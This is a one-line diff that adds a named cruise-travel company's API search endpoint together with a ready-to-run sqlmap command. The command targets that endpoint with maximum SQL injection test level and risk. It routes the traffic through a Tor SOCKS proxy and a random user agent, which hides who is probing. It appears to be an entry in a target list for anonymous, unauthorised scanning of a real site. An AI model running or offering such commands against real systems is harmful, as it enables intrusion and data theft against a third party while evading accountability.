@@ -1,0 +1,1 @@
+http://www.cruiseshipcenters.com/api/searchcenter (GET)  # sqlmap.py -u http://www.cruiseshipcenters.com/api/searchcenter --proxy=socks5://127.0.0.1:9050 --batch --random-agent --level=5 --risk=3 --banner
